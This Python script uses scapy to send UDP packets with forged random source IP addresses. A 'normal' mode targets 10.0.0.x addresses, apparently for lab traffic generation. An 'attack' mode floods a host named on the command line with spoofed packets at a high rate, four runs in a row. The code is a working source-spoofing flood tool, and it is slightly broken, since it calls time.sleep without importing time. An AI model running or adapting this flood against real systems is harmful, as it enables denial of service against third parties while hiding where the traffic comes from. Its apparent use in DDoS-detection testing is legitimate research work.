import subprocess
import random
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether, TCP

def GenerateIP(mode, min=None, max=None, destIP=None):

    invalid_start = [10,172,192,169,127,255]

    first_octet = random.randint(1,255)
    while first_octet in invalid_start:
        first_octet = random.randint(1,255)

    second_octet = random.randint(1,255)
    third_octet = random.randint(1,255)
    fourth_octet = random.randint(1,255)

    src_ip_address = ".".join([str(first_octet), str(second_octet), str(third_octet), str(fourth_octet)])

    dst_ip_address = ""

    if mode == "normal":
        dst_ip_address = ".".join([str(10),str(0),str(0), str(random.randint(min, max))])

    elif mode == "attack":
        dst_ip_address = destIP

    return src_ip_address, dst_ip_address

def StartSpoofing(mode, min=None, max=None, destIP=None):

    interface = subprocess.Popen('ifconfig | awk \'/eth0/ {print $1}\'',shell=True,stdout=subprocess.PIPE, universal_newlines=True).communicate()[0]
    max_packets = 500
    interval = 0.1
    dport = 80
    sport = 2

    if mode == "normal":
        max_packets = 1000
        interval = 0.1
        dport = 80
        sport = 2

    elif mode == "attack":
        max_packets = 500
        interval = 0.025
        dport = 1
        sport = 80

    for i in range(max_packets):
        src, dst = GenerateIP(mode, min, max, destIP)
        packets = Ether()/IP(dst=dst,src=src)/UDP(dport=dport,sport=sport)
        print(repr(packets))
        sendp( packets,iface=interface.rstrip(),inter=interval)
	

def mymain():
    parser = argparse.ArgumentParser()
    subparser = parser.add_subparsers(dest='mode')
    normal = subparser.add_parser('normal')
    attack = subparser.add_parser('attack')

    normal.add_argument('--min', type=int, required=True, help='minimum number of hosts')
    normal.add_argument('--max', type=int, required=True, help='maximum number of hosts')

    attack.add_argument('--dest', type=str, required=True, help='Destination of a host to attack')

    args = parser.parse_args()
    
    if args.mode == "normal":
       StartSpoofing(args.mode, args.min, args.max, None)

    elif args.mode == "attack":
       StartSpoofing(args.mode, None, None, args.dest)
    else:
        print("pass correct mode: normal/attack")
        
if __name__ == '__main__':
	for i in range (1,5):
		mymain()
		time.sleep (10)
